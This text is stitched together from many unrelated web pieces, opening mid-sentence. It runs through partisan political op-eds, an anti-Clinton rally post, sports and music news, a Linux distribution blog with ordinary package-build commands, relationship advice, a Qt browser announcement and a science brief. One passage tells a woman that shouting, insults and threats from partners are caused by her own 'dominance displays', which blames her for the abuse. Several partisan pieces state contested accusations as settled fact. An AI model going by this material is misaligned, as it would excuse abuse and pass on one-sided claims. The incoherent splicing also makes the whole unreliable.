governance of cities like Chicago over the past half-century. It took Trump to make people realize it. Suddenly, the left's credibility is toast – not because Trump has argued against it, but simply because he has directed the public's attention to it. So also with jobs, national security, health care, and the rest. Join the president and shine your light of consciousness on the left's mental prison, and watch it dissolve under your gaze. America stands at a great spiritual crossroads, where we must choose either to remain imprisoned by the left's dehumanizing materialism – a politics focused on the "right" to abortion, racial reparations, unlimited benefits, and transgender bathrooms – or to rise and realize our great potential as free and enlightened human beings inhabited by divinity. It is the end of their world, if not the world per se – the end of all that has been constructed by the left from Wilson to FDR to LBJ and Obama, to exert control over consciousness. Free your consciousness, and shine its light on what remains of the left's moral authority. Watch their grand illusions dissolve. Sit back and enjoy the end of the world.

With all of this talk about the Donald Trump video that was released, it would have been best if Hillary Clinton had just stayed out of it. You know, since her husband was (is?) a serial philanderer with several non-consensual sexual encounters under his belt (READ: rape).
But of course, she felt the need to chime in, which angered a lot of people who realize that she is throwing rather large stones from a rather delicate glass house. This was made clear at an Ohio State University rally, when a group of protesters showed up just to remind her of her husband's past (and illegal) indiscretions.
While colleges and Universities are the epicenters of liberal indoctrination, there are some students who have managed to keep a shred of sanity, like Trey Odell, who refuses to vote for Hillary Clinton simply because she's a woman.
Hillary is at OSU today. Going to go just to heckle her #HillaryForPrison — Trey Odell (@iAmBruce17) October 10, 2016
Wherever there are controversial politicians, there are sure to be protesters. Hillary is one professional politician that people just love to hate, and the truth is that she just makes it so easy.
Protesters at the OSU rally gathered and carried “Bill Clinton is a Rapist” signs, wore “Hillary For Prison” shirts and waved a flag saying “Come And Take It.”
They began a rousing chant of “Bill Clinton Is A Rapist,” which you can see below.

This comes after Breitbart interviewed Bill Clinton rape victim Juanita Broaddrick in a heart-wrenching video that will leave you hot under the collar.
Broaddrick cries as she recounts the horrifying night when Clinton violated her in the worst way imaginable. At one point during the interview, another Clinton victim Kathleen Willey went to comfort a sobbing Broaddrick.
“It's not your fault. Okay. It's not your fault. It's not your fault. You didn't do anything wrong. You didn't do anything wrong. Okay. Okay?”
Hillary Clinton set out to destroy these women after finding out that her husband was sexually involved with them, but she has the gall to feign outrage at what Trump said?
The nation needs to be reminded that Bill Clinton has a zipper problem, and it has ruined lives, all thanks to his “loving” wife.

BIRMINGHAM, Ala. — Bad News Barrett went under the knife on Tuesday to repair his injured shoulder, suffered when he was thrown into a barricade by Jack Swagger on the June 27 edition of SmackDown. The surgery was performed by Dr. Jeff Dugas in Birmingham.
“ Bad News Barrett underwent a ligament reconstruction in his shoulder, as well as a distal clavicle resection, where the end of the collar bone is shaved off,” WWE physician Dr. Chris Amann said. “The operation went very well, he's resting comfortably.”
The untimely injury cost Barrett the Intercontinental Championship and an opportunity at the Money in the Bank contract this past Sunday. Now, the surly Brit will be out of action as he waits for his surgically repaired shoulder to fully heal, so he can pummel his foes with the Bad News Bull Hammer Elbow once again. Once he is cleared to return to the squared circle, it will only be bad news for the rest of the WWE roster.
While US “outrage” at civilian casualties from Syrian airstrikes is being used as a pretext for military intervention against the Syrian government, US forces continue their own airstrikes backing military operations in northeastern Syria, and are killing an increasing number of civilians in their own right.
Today, US airstrikes near Raqqa killed at least 21 people, mostly civilians, and while some of the strikes were near fighting between US-backed troops and ISIS, at least one of the strikkes appears to have been a deliberate attack on a boatload of civilians attempting to cross the Euphrates River.
The boat was carrying about 40 people, and NGOs say that at least seven bodies, six of them children, have been recovered so far, with more missing. The US has dropped leaflets in the area urging civilians to flee toward the Euphrates, but apparently dropped a second leaflet warning them not to try to cross the river or they'd be attacked.
The airstrikes centered around the village of Hanida, which is along the Euphrates River west of Raqqa. The Syrian Observatory for Human Rights reported a number of additional civilians killed in US strikes on the village. That the US is attacking the village is puzzling, because ISIS is not believed to have any presence in the village itself, and it appears to be at least some distance from the fight.
The biggest target in the Hanida strikes was an Internet cafe, with the US strikke destroying the site, killing 14 people within, including four children. The US is so far not offering any justification for any of the attacks in the area.

Twelve years ago I was eighteen and just entering college. Since then, friends and acquaintances have come and gone, girlfriends have come and gone, and I met the love of my life, Angel. I've found through my years – through my experience with my own personal relationships – that there are certain undeniable truths that affect the quality and longevity of our relationships, and the resulting impact they have on us. I share them with you today in hopes that they save you from a little heartache and confusion.
You have to love yourself first. – In order to truly have a loving, supportive, and long-lasting relationship with someone else, you need to learn how to be your own best friend first. It's all about falling in love with yourself and sharing that love with someone who appreciates you, rather than looking for love to compensate for a self love deficit. Read The Mastery of Love . You get what you put in. – In twelve years, people won't remember what clothes you wore, which car you drove, and maybe not even your full name. But in twelve years, they will remember how you made them feel and the positive memories you gave them. The true impact you make on people will depend on the time and attention you give to teaching those who know less, caring for those who have less, supporting those who are striving, and tolerating those who are different than you. What most people think of you doesn't matter. – You wouldn't worry so much about what people thought of you if you knew just how seldom they do. No one is ever going to care about your life and the way you choose to live it more than you will. That is a beautiful thing – never forget how beautiful. Follow your heart, and take your brain with you every step of the way. Get to know your true self. When you are truly comfortable in your own skin, not everyone will like you, but you won't care about it one bit. Friends and family won't always support your goals, but you must pursue them anyway. – Follow your intuition. Following your intuition means doing what feels right, even if it doesn't look or sound right to others. Only time will tell, but our human instincts are rarely ever wrong. So don't worry about what everyone else thinks; keep living and speaking your truth. The only people that will get mad at you for doing so are those who want you to live a lie. Read The Art of Non-Conformity . Life doesn't always change as fast as people do. – Learn to accept that not everyone is who you once knew. And realize that sometimes it's not the person you miss, it's the feeling you had when you were with them. Some people are meant to stay in your heart, but not in your life. – If you're having a tough time letting go of someone who left you, realize that if they wanted to stay they would still be there. Sometimes you have to forget what's gone, appreciate what still remains, and look forward to what's coming next. It sucks when you know that you need to let go, but you can't because you're still hoping for the impossible to happen. Yes, it will hurt for awhile, but you have to forget about the person who forgot about you, and move on. Everyone has baggage, just like you. – The minute someone decides to walk out of your life, that is the same moment in which the opportunity and space opens up for someone who actually deserves your love to finally walk in. Remember, everyone has baggage, so don't be ashamed of yours. Be patient and find someone who loves you enough to help you unpack. Love doesn't hurt. Love is not the problem. – Don't blame love if a failed relationship interfered with your other important relationships, or robbed you of your self-esteem and personal freedoms. No, don't blame love. For it wasn't love that stole from you. It was possession. It was obsession. It was manipulation. It was confusion. Love had nothing to do with your situation. For love doesn't close the door against all that is good. It opens it wide to let more goodness in. Love creates freedom and abundance. Read The 5 Love Languages . Forgiveness is always the right choice. – Anyone can hold a grudge, but it takes a person with strong character to forgive. When you forgive, you release yourself from a painful burden. And no, forgiveness doesn't mean what happened was OK; and it doesn't mean that person should still be welcome in your life. It simply means you have made peace with the pain, and are ready to let it go and move on with your life. Love requires three things: acceptance, honesty, and commitment. – Love comes when you care more about whom the other person really is, rather than about who you think they should become. It's about daring to reveal yourself honestly, and daring to be open and vulnerable over the long-term. It's about sticking by each other's side through thick and thin, and truly being there in the flesh and spirit when you're needed most. Remember, the most romantic love story is not Romeo and Juliet who died young together; it's the story of grandma and grandpa who helped each other through life, and grew old together. A big part of who you become is who you choose to surround yourself with. – Fate controls who walk into your life, but you decide who you let walk out, who you let stay, and who you refuse to let go. Surround yourself with people who make you a better person, and let go of those who don't. A soul mate is a person who brings out the best in you. – They are far from perfect, but they are a perfect fit for you. Remember, every relationship has its problems, but what makes it perfect is when you wouldn't want to be anywhere else, even when times are tough.

But Democrats were not in a negotiating mood, at least on Friday, soured by how a seeming alignment with Mr. Trump on the immigration issue was ruptured by subsequent White House demands for money for the president's wall on the southern border with Mexico and other hard-line policies as trade-offs. They expressed more anger over the Mr. Trump's health care actions, seeing them as deliberate efforts to sabotage the system to get Democrats to the table.
“What brings us to the table is trying to do some good for people,” said Senator Chuck Schumer, Democrat of New York and the minority leader. “But as in the past, threats and bullying is not going to work. In this, politically, he's in much worse shape than we are. The American people, even a large number of Republicans, are on our side in terms of improving the system, not destroying it. And so I don't think he has much leverage to threaten or bully.”
William A. Galston, a former White House domestic policy aide to President Bill Clinton, said Democrats were unlikely to respond to Mr. Trump's pressure tactic. “It's equivalent to hitting a mule over the head with a two-by-four and then expecting it to nuzzle up to you,” he said. “In the current climate, it's difficult for me to believe that Democrats are going to come running to Trump and say, ‘O.K., let's negotiate now on health care.' I just don't see that happening.”
In forcing the issue on health care, Mr. Trump may have scuttled bipartisan talks already underway about legislation intended to stabilize the insurance markets under Mr. Obama's Affordable Care Act. He also scrambled the congressional agenda at a time when lawmakers face several big tests in coming weeks.
Congress is already struggling to restore funding for a children's health care program that expired, and it faces a Dec. 8 deadline to finance government operations across the board. The immigration program will expire in the new year without action, and at some point around then lawmakers will have to increase the debt ceiling or face default.
Mr. Trump also faces obstacles to pushing through his major tax cut program by the end of the year. And his Iran decision on Friday starts a 60-day clock for lawmakers to consider reimposing sanctions on Tehran, a move that would effectively blow up the nuclear agreement.
Aides to the president said there was no concerted effort to use executive power all at once to move his agenda forward, and that each decision was driven by separate timetables, some of them according to various legal calendars. But they also noted that Congress in recent years has demonstrated that it rarely takes difficult decisions unless it faces deadlines with dire consequences for inaction, such as a government shutdown.
At a fanmeet on April 19th, EXO announced to fans that they will be bringing EXO'LUTION to Japan, hitting both Osaka Dome and the dream stage, Tokyo Dome.
Almost immediately following this news, EXO-Ls took to Twitter to share their joy and excitement, sweeping the Worldwide Trends. Not only was done “#CallMeBaby11thWin” trend as first, Tokyo Dome trended both in English and Korean.
Fans were ecstatic at this news – not only has EXO not made a Japanese debut, they have only been active in the Korean music industry for three years. These commenters were quick to note that seniors such as SHINee and Girls' Generation had been active for longer periods of time and released music in Japan prior to their Tokyo Dome stages.
The Tokyo Dome tour is expected to be a three day spectacle running from November 6th through November 8th before the boys take on Osaka Dome from November 13th through November 15th.
With Tokyo Dome seating a massive audience of up to 55,000 concert attendees, many are left questioning if and when the group will be able to sell out the venues just as with their Seoul tour stops. Furthermore, Tokyo Dome is said to operate on an invite-only basis, specially selecting artists to perform at the venue. It's no wonder that many artists consider this their dream stage.

Why to switch from Ubuntu to Antergos
Cookie Engineer Blocked Unblock Follow Nov 6, 2016
It's me again. This time I want to say that Arch is amazing. No seriously, beside the jokes of /r/linuxcirclejerk I want to describe and explain the advantages that an Arch-based distro has over other distributions.
As I'm a GNOME lover I kind of represent both the “real world user” and a “developer” here. I hate doing things in Terminal (except my only true love VIM ❤) and I want to automate all the things, so the problems never distract me again from my real work on my computer.
I'm not a hired sysadmin, so I don't give a f*** about anything related to DevOps. I do not like DevOps, I think it is wasted time. I want to build things, not infrastructure. Having said that, we might continue now :)
The Story of Tales with Ubuntu
I was using Ubuntu eversince it came out with its first release. Before that I was using Debian GNU/Linux since I was 11 years old. No seriously, I was using Debian-based systems for nearly 18 years now.
As many things broke over the years, I went to being an APT shadow and compiling things for others. But mostly for my own reasons, because most of the stuff I require on my machine won't be compiled by others in the first place. At least that's what I thought when using Debian all the time.
One day, my machine broke again because the System Upgrade didn't work. I was skipping my Ubuntu system upgrade since last October (2015.10) of my UbuntuGNOME distribution because I saw my brother doing it; and it broke completely with the 2016.04 release due to systemd and wayland.
A real Ubuntu user is only one that needs to update his system from scratch because every config breaks anyways ;-)
So, big deal was a Bug of the Intel driver that was fixed upstream for around 5 years already. It affected me and my old i915 graphics card, so it was really annoying having a backlight display that always re-activates itself when you're coding in the dark. That shitty bug made me almost rage and hurt my laptop because it was so annoying and nearly impossible to fix.
Self-fixing Bugs in Ubuntu or Debian
When you have a Debian based distribution and you want to fix things yourself (because you know that a Bug has been fixed for 5 years already) there's the so-called “development header packages” concept where libraries themselves are shipped as binaries and their development files are shipped seperately to save the average user hard drive space. At least that's the basic idea, there seems to be no reasonable naming concept for those packages, as some packages are delivered by single packages (like mesa ships all mesa-* packages, too) etc.
The real troublemaker behind a “package-dev” concept is the amount of unnecessary source code that lands on your system. If you want to develop, say, a fix for the graphics driver - chances are high that you have to get the source code of the linux kernel and Xorg as well. And tada, you just wasted at least over 5 Gigabytes of your hard drive with unnecessary downloads of source codes that you never wanted in the first place.
Broken Dependencies
Ever wondered why you need to install the email-client evolution and its evolution-data-server for the usage of GNOME? A Debian maintainer decided that it's good as a default package, so you are forced to install that unnecessary 300MB just for the sake “if you choose to use evolution as an email client”.
That philosophy is basically what got me into going away. If you want to ship or use a newer GNOME shell yourself (or by using say, the Debian testing version of it for yourself directly) you get into trouble real fast. The dependency chain is unimaginably complex and you need to download a shitload of packages to match the version criteria.
Again, as we use Debian, we cannot simply use the most-up-to-date packages, we have to use specific versions that existed 5 years ago (and therefore limits in how “up to date” we can actually be on the system). I'm just referring to the OpenSSL mess here. Or say, Wayland and systemd. Pretty much all f***ed up in Debian.
Why Antergos and not Arch?
The question I get a lot is why I'm not using Arch Linux directly, because most of my stuff is bleeding edge anyways. The only reason I have is: I'm too lazy to deal with parted and other commands. I want a graphical installer. I have no Android tablet opened in parallel to _install my system_. It's not that i gain anything in knowledge here, I did that back in my Slackware-days already. And I'm not going to do it again. It's effing 2016, man. Grow up and deal with it.
As dumb as it sounds and as XFCE users are not reading any further by now, I can explain more awesomeness of upstream Arch without having to deal with people using a shell environment variable (HTTP_PROXY and HTTPS_PROXY) to use a Proxy for each networked application.
The power of Arch Linux.
From my personal developer-and-UI-lover view, I think Arch Linux is still a big deal. Its strength is definitely the build workflow and the package management system.
Also, pretty much everything is as up-to-date as humanly possible. I mean, VIM comes out and less than 10 hours later I got the binary package update. It's not only VIM, it's almost anything because of AUR.
Granted, I think the pacman syntax (e.g. pacman -Sy and -Su instead of apt-get update && apt-get upgrade) sucks, but I've written apt-pac for exactly that.
The concept behind Arch's package management is that they have the official packages (that are hosted at packages.archlinux.org) and the AUR — the Arch User Repository — where pretty much anything that you can even imagine is already available in. If anyone compiled anything on the planet, it's probably in AUR already. Seriously, I often wonder how awesome that is ❤
You can imagine the AUR as a centralized PPA alternative. The only difference is that you have a centralized package “host”, not spread-out different ones from dozens of unsynchronized sources like it's the case on launchpad. You always get into trouble updating from different PPAs, because they most likely ship different dependencies of libraries — dependent on when and on what system they compiled it.
Fixing my own graphics driver
So, as it happened before already, I'm not new to this issue. My mind-boggling moment came when I first wanted to fix a package myself and apply a patch to it to see whether a bug in mesa affected me or not.
I asked over in /r/archlinux on how to achieve that and where to apply the patches to (and basically let them know I was still an Arch Noob at the time). The friendly people over there were uber awesome, they are a friendly community and they always like to help ❤
So, the real deal behind Arch is ABS — the so-called Arch Build System. You first need to install ABS (by using pacman -S abs) and then you need to execute it one time (sudo abs) to sync its database. That might take a while, depending on your internet connection.
What that does be it downloads all the PKGBUILD and patch files of all packages. That means you now can build packages yourself on your machine, using the ABS build workflow.
If you think that ABS explodes in size: It's currently 50.5MB for each and every package that is available. Take that, suckers!
Package Dependencies
On an Arch-based system, you basically need only a few dependencies to start building libraries. In my case I only needed the base-devel package to get going.
The idea behind Arch's packages is that all binary libraries ship with their own development headers — excluding the source code. That, my friends, is a big deal in system size. It saves over 8GB on my machine compared to Ubuntu. More free space for more unsorted stuff in my Downloads folder — awesome! :)
Having said that, it means that when you install the binary library package glibc, it also contains the development headers so that you can include it in your source code right away — without having to download the glibc-dev package, for example.
Building your own Driver with a Patch
If you want to build your own driver, you start with the PKGBUILD template of the official package. The complete build workflow from A-Z for a package looks like this, taking the example of the mesa package that needed to be fixed with an upstream patch:
sudo pacman -S abs base-devel;
sudo abs;
mkdir -p ~/abs/extra/mesa;
cp -R /var/abs/extra/mesa ~/abs/extra/mesa/;
cd ~/abs/extra/mesa;
# Apply patch files now, edit PKGBUILD file
makepkg -s;
As you see, no further dependencies were required to compile mesa. The cool thing is that the ABS build workflow does not need further package dependencies regularly installed (and probably uninstalled) on your system, so you can simply delete the folder afterwards to give up free space.
My personal ABS repository contains all the fixes that I apply on my system on a regular basis (and I use the releases section for binary packages). Currently, I decided to create a GNOME shell fork and to make some heavy changes to it. And I required exactly zero libraries to be additionally installed for that :)
The build flow was setup within less than 5 minutes and I was able to release my own GNOME shell fork to the public (read: as a binary package) within less than 3 hours; while 99% of the time was me writing code, not infrastructure build chain.
Arch is blazing fast
No, seriously. I mean it. You never experienced the power of systemd before it. No matter what you think, I think there's no way of getting faster as with an Arch-based system. It has proper UEFI “ultra fast boot” mode support, systemd is rocking hard.
I even plotted an SVG for you, if you don't believe me (generated with systemd-analyze plot), unmodified, running Arch on a low-end Intel NUC i5 (worth 100$ as it's 2 generations old by now) with a 1.8Ghz dual core:
Now you can try to compete with that on Debian. Good luck, I think it's impossible. The equivalent Debian system took way more than 50 seconds to bootup on identical hardware. 6.32 seconds is the unoptimized OEM Arch/Antergos setup and the default behaviour; auto-login into GNOME, with chromium, TOR, cjdns and all other things already being started — with all the generic kernel mods loaded.

I found a GPL violation. No, just kidding — I wanted to say that Arch is amazing. If you are a normal user, check out Antergos. Antergos to Arch is basically the Ubuntu to Debian and even more amazing.
Advertising writers in Florida were planning to pitch hemorrhoid-relief products with a commercial featuring the Johnny Cash classic "Ring of Fire," but Cash's family said there's no way they will let it happen.
"We would never allow the song to be demeaned like that," Cash's daughter, Rosanne, told the Tennessean of Nashville, Tenn.
The hit was written by Cash's wife, June Carter Cash, and Merle Kilgore, who now is Hank Williams Jr.'s manager. Both Johnny Cash and June Carter Cash died in 2003.
TV producer Sula Miller of Big Grin Productions in Fort Lauderdale, Fla., said she thought of the idea when she heard the song on the radio while struggling with the uncomfortable condition.
Kilgore said at first he thought the idea was funny, and that he often joked about hemorrhoids onstage whenever he'd introduce Ring of Fire.
But Cash's family is not laughing.
"He (Merle) started talking about this moronic tie-in without talking to any of us," Rosanne Cash told the Tennessean. "The song is about the transformative power of love and that's what it has always meant to me and that's what it will always mean to the Cash children."
Kilgore said it was not his intention to upset the family.
"Love is a burning thing/ and it makes a fiery ring/bound by wild desire," the song goes. "The taste of love is sweet/ when hearts like ours meet/ I fell for you like a child."
Lovely Sexy Beauty has recently posted a list of behaviors her man* is displaying in their relationship, and that apparently OTHER men in the past have displayed towards her, and I quote:
Displaying extreme anger via shouting, cuss words (which I don't use nor do I like), and Mel Gibson-style storming around
Blaming me for things out of my control (e.g., things my parents or friends do)
Insulting me in terms of how I look, my age
Making threats of leaving the relationship if I don't change
Of course she is being told these behaviors are “red flags” of abuse in the comments and being unequivocally supported in the comments and as ALWAYS is not ONCE asked what behaviors SHE might be engaging in to cause these behaviors to come to the fore in MORE than one man.
When a man behaves this way it is because YOU are vying with him for dominance. When a woman does this with a dominant man, she becomes like unto a man to him–she ceases to be the sweet feminine thing he wants to guard and protect and becomes a FOE. What kind of FACES are you making at your man when you fight?
Most likely when you fight, you are making yourself a MAN to him. You are making UGLY faces at him, and what is it that makes a woman “ugly”? Resembling a man.
Have you ever stopped to consider this? Are you making direct eye contact and trying to stare him down while simultaneously making yourself look like a man? Are you belittling him? Expressing disappointment or even worse, hinting at his insignificance? Those are what's called between men “FIGHTING words” and when MEN use them with each other, someone's gonna get hurt.
Of course, not all men are like this because not all men are particularly dominant. Some men have a much higher tolerance of female dominance displays and others are downright submissive. But if this is happening to you repeatedly, check your premises–the common denominator is YOU.
*note: I do not know lovelysexybeauty and am merely using her post as a springboard to discuss dominance–no intent to begin any manner of blog war is implied by drawing notice to her post

We have recently open sourced Qt WebBrowser!
Qt WebBrowser (codename Roadtrip) is a browser for embedded devices developed using the capabilities of Qt and Qt WebEngine. Using Chromium, it features up-to-date HTML technologies behind a minimal but slick touch-friendly user interface written in Qt Quick.
All basic browser features are supported: You can search for text (both in history and via Google). You can bookmark pages, navigate in the page history, and open multiple pages concurrently. Depending on the codecs available, full-screen video and audio playback should also just work. You can also enable a private browser mode that leaves no traces after the browser is closed.
So far the browser has been only shipped as part of the Qt for Device Creation demo, but we're now releasing it also separately under GPLv3 and Commercial licenses. The browser serves as a testbed and demo for Qt and Qt WebEngine, but we see that it can also be used in your device solutions. So please talk to us if you have any kind of feedback, particularly feature requests! The preferred place is JIRA, but you can also just drop us a mail.
The browser is optimized for embedded touch displays (running Linux), but you can play with it on the desktop platforms, too! Just make sure that you have Qt WebEngine, Qt Quick, and Qt VirtualKeyboard installed (version 5.7 or newer). For optimal performance on embedded devices you should plan for hardware-accelerated OpenGL, and around 1 GiByte of memory for the whole system. Anyhow, depending on your system configuration and the pages to be supported there is room for optimization.
More details about the browser's user interface and capabilities can be found in the documentation. The source code is hosted on code.qt.io.

Rally Australia is awaiting approval from the FIA to be granted a three-year annual contract.
Since 2009 the Australian round of the World Rally Championship has alternated with Rally New Zealand, staging an event only every two years.
The bi-annual arrangement has made it challenging for the Event to find sponsorship stability.
Destination NSW remains firmly in favour of the organiser's desire to return to the WRC calendar on an annual basis.
Rally Australian event manager David Catchpole confirmed a submission has been lodged with the FIA.
If the request is successful it could come at the price of Rally New Zealand which has been a vital part of the WRC since the 1970's.
“We have a submission in and we want it to remain here on a three-year contract,” Catchpole said at the official event launch in Coffs Harbour.
“For this event to grow we can't keep going on a bi-annual basis. You can't attract someone like Coates Hire who have come on as naming rights sponsor and expect it to work. For them to leverage of it is needs to be on an annual basis.”
Catchpole says it is vital for the event's survival that the FIA and its promoter Red Bull Media to come to the party.
“It's all looking good from the business model that we've put to the WRC so we are hoping to have an answer in the next three to four weeks.”
Rally Australia initially understood they were to be supplied with an answer at the end of June following a meeting of the FIA's World Motor Sport Council but it was not forthcoming.
This cartoon was meant to be published in the Guardian yesterday but was pulled at the last minute. Were they right? Did I go too far? Maybe they saved my bacon. Not sure whether to be angry or not. Considering that half of Western art is about religion it feels silly avoiding it.
I'd be interested to hear what you lot think because I honestly don't know.
POSTSCRIPT (a couple of months later)
Crucifixion Diptych Yellow Christ I concede there is a problem with this cartoon. I thought up this non-art joke and felt I could easily slot in the appropriate art reference (it occasionally happens this way). As the history of Western art is a smorgasbord of crucifixion scenes I figured I'd easily find the appropriate image. Nope. I needed a slightly klutzy and preferably adolescent-looking Jesus but most figures nailed to the cross in Renaissance and Baroque art are very fit-looking, sage-like figures. Either that or it's all a bit gruesome. I realised my best bet was to look to Northern European, early Renaissance art, which was far less prone to the heroic idealisation of Italian art. Rogier van der Weyden'sfit the bill but unfortunately it is not a familiar depiction of the crucifixion (i.e. famous). The joke would have worked far better if it was some immediately recognisable, iconic painting. In not being famous the discrepancy between my klutzy cartooning style and the more realistic crucified figure perhaps emphasises the sadistic, tragic dimension of being crucified – obviously not my intention. Annoyingly, the perfect crucifixion scene was lurking out there but just didn't occur to me in time – Paul Gauguin's. It is much more well-known than the Van Der Weyden, is non-heroic and, ridiculously perfectly for me, is quite cartoonish.
As my brief is to draw cartoons on Art I can see that the cartoon, with an unrecognisable art reference, could be construed as going off-piste. But whether people got the specific reference or not, I felt that the ubiquity of paintings and sculptures on the Crucifixion made it an obvious generic reference to art history.
most famous (On a side note I was surprised to realise that there are very few really famous crucifixion scenes. This one is probably the– imagine if I had used that!)
Obviously I was aware I was treading on thin ice to attempt a cartoon on this subject. Using imagery and subject matter that some people hold in reverence in a non-reverential way will antagonise. However I felt I had carefully avoided causing any true offence. The use of “JESUS CHRIST” as an expletive is, quite feasibly, offensive to some people. In the cartoon we read it as an expletive, but then realise that Joseph is simply shouting out his son's name. This mistake causes the reader to collapse and possibly faint with laughter.
Madonna's use of it When I try to identify the precise nature of the offence caused by using the crucifixion I have to say I am irked by the answer. If anyone can honestly construe my cartoon to be an attack on Christianity then my motto must be “Jugulars are for jerks. Go for a capillary!” Quite clearly my intention is humorous and silly. I will preface everything I say from here on by emphasising that this is a question of scale. I findas crass as anyone else. But the manner in which I use it – small-scale, for obviously humorous, non-attacking reasons, yet still censored – then this forbidden quality sets off alarm bells with me. I can't find a good enough reason why people should be insulted other than the fact that some people say it is untouchable. If I had genuinely caused offence then I would feel fine about the cartoon being pulled. But after a closer look the reasons seem pretty lame.
My position (on life I guess)…
Clive James has a good line on the strength of liberal democracies – they are under constant attack from within. This is a far better state of affairs than being ruled by an authority who cannot be questioned. My opinion is that anyone who tells you that this particular person or that particular book is the sole truth, cannot be questioned, and that anyone who says anything different is wrong – well, they're not talking about morality, they're talking about power.
The words below by the late, great Richard Feynman sum up my general viewpoint far more eloquently than I could. He's not just talking about science…
THE ROLE OF DOUBT IN SCIENCE
The scientist has a lot of experience with ignorance and doubt and uncertainty, and this experience is of very great importance, I think. When a scientist doesn't know the answer to a problem, he is ignorant. When he has a hunch as to what the result is, he is uncertain. And when he is pretty darned sure of what the result is going to be, he is in some doubt. We have found it of paramount importance that in order to progress we must recognize the ignorance and leave room for doubt. Scientific knowledge is a body of statements of varying degrees of certainty — some most unsure, some nearly sure, none absolutely certain.
Researchers in the USA and Japan say they may have found the cause of the first mass extinction of life.
There have been five mass extinctions since the divergent evolution of early animals 600 -450 million years ago (Figure 1). The cause of the third and fourth was volcanic activity, while an asteroid impact led to the fifth. But triggers of the first and second mass extinctions had, until now, been unknown.
The first mass extinction occurred at the end of the Ordovician. This age is between the divergence of the Ordovician and land invasion of vascular land plant and animals. Animals in the Ordovician-Silurian comprised marine animals like corals, trilobites, sea scorpion, orthoceras, brachiopods, graptolite, crinoid and jawless fish. Approximately 80% of species disappeared at the end of the Ordovician.
A team led by Dr. David S. Jones of Amherst College and Professor Kunio Kaiho of Tohoku University, looked into possible triggers of the first mass extinction. They took sedimentary rock samples from two places - North America and southern China -- and analyzed the mercury (Hg) in them. They found Hg enrichments coinciding with the mass extinction in both areas.
This, they believe, is the product of large volcanic eruptions because Hg anomaly was also observed in other large igneous province volcanisms.
Huge volcanic eruptions can produce sulfate aerosols in the stratosphere. Sulfate aerosols are strong, light-reflecting aerosols, and cause global cooling. This rapid climate change is believed to be behind the loss of marine creatures.
Kaiho's team is now studying the second mass extinction in the hopes of further understanding the cause and processes behind it.

By now most of the politically-inclined citizens of our nation with internet access have seen Rep. Anthony Weiner's tirade on the floor of the House last week. It was an impressive display of apoplectic anger and represents the most honest assessment of the House Republican caucus that anyone has given in years. In short, the gentleman from New York's 9th district called House Republicans ‘cowards who refuse to vote their conscience.' Anthony Weiner is absolutely correct.
The conservative mainstream media disagrees, however, and has seen fit to describe this episode as the reason why Americans despise the whole of Congress. The take of much of the media, both inside and outside of the beltway, is that Democrats are the reason the bill failed because they used a procedure that required a 2/3 majority instead of the normal simple majority. In the twisted political gymnastics of our time, the Republican claim (supported by the mainstream media as all their claims are) is that their “no” votes don't count because the Democrats asked for too many “yes” votes.
This bill is not a part of the President's domestic agenda. This bill is not a part of Speaker Pelosi's sinister plot to control the world (or whatever it is that conservatives believe these days). The James Zadroga 9/11 Health and Compensation Act of 2010 simply provides the funds for extended care for the first responders of 9/11. The heroes who ran towards the cataclysm when others ran away need our help now. They are suffering from delayed and chronic effects from the toxic dust created by the fall of the Twin Towers. It is a simple, straightforward, non-partisan piece of legislation that should have been debated over total cost and little else. So what happened?
The Republicans decided the bill gave them an opportunity for more election year shenanigans. They attached a poison pill amendment to the legislation; a clause that would stipulate that no funds be given to first responders who were found to be illegal aliens. That there were any illegal aliens employed by New York City's emergency services at all is beyond the point. That conservatives would feel that illegal aliens who rushed to support Americans in their darkest hour need not be supported themselves is also beyond the point.
The Republicans were setting the Democrats up using a tried and true legislative tactic (both parties use it). If the Democrats voted for the bill, they would be voting against benefits for illegal aliens, a move the Republicans planned to use against their opponents with Hispanic voters in November. If Democrats chose to vote against the bill, the Republicans could claim an outright victory, as their only interest in this Congress is to say no to everything.
The Democrats decided to put an end to the amendments, pure and simple. They wanted a vote, shockingly enough, on the bill they were considering, and not some endless stream of GOP garbage. The Democrats wanted to do the people's business, so they used a procedural rule to bring an end to the amendment process by requiring the super-majority for passage. And why shouldn't they? You either believe the bill is important or you don't. You either choose to support the heroes of 9/11 by spending the money, or you hide behind the deficit…again. This is the summary of the bill the Republicans decided wasn't worth their votes.
The James Zadroga 9/11 Health and Compensation Act of 2009 – Amends the Public Health Service Act to establish within the National Institute for Occupational Safety and Health the World Trade Center Health Program (WTC program) to provide: (1) medical monitoring and treatment benefits to eligible emergency responders and recovery and cleanup workers who responded to the World Trade Center terrorist attacks on September 11, 2001; and (2) initial health evaluation, monitoring, and treatment benefits to residents and other building occupants and area workers who were directly impacted and adversely affected by such attacks. Requires the WTC program administrator to: (1) implement a quality assurance program; (2) establish the WTC Health Program Scientific/Technical Advisory Committee; (3) establish the WTC Responders Steering Committee and the WTC Community Program Steering Committee; (4) provide for education and outreach on services under the WTC program; (5) provide for the uniform collection of data related to WTC-related health conditions; (6) conduct research on physical and mental health conditions that may be related to the September 11 terrorist attacks; and (7) extend and expand arrangements with the New York City Department of Health and Mental Hygiene to provide for the World Trade Center Health Registry. Authorizes the administrator to make grants to the Department to address mental health needs relating to the terrorist attacks. Amends the Air Transportation Safety and System Stabilization Act to: (1) make individuals eligible for compensation under the September 11 Victim Compensation Fund of 2001 for harm as a result of debris removal; and (2) extend the deadline for making a claim for compensation.
Not exactly the stuff of big government tyranny is it? A total of 155 Republicans and 4 Democrats voted against this measure for the 9/11 heroes. The fact that a 2/3 majority was required did not force those 159 into “no” votes. Nor did it force the 11 Republicans and 7 Democrats who didn't make the vote into their positions. The 159 chose to vote no; they did it of their own volition, and the gentleman from New York's 9th is exactly correct. They are all cowards for hiding behind procedure.
I think, however, that the greater folly in this matter is the false equivalency that the conservative mainstream media now seeks with every story. The ridiculous notion that there is always two sides has once again misled the American people. Our nation needs the unequivocal and undiluted knowledge that partisan politics was more important to House Republicans than the heroes of 9/11. There was no thought of race, nationality, religion, or political procedure in the decisions of the first responders to run towards an apocalypse. Unfortunately, the GOP has made a policy of stopping to consider all of those parameters of late. America should be well used to that paradigm by now.

WASHINGTON (Reuters) - U.S. Attorney General Jeff Sessions abruptly asked the remaining 46 chief federal prosecutors left over from the Obama administration to resign on Friday, including Manhattan U.S. Attorney Preet Bharara, who had been asked to stay on in November by then President-elect Donald Trump.
Although U.S. attorneys are political appointees, and the request from Trump's Justice Department is part of a routine process, the move came as a surprise. Not every new administration replaces all U.S. attorneys at once.
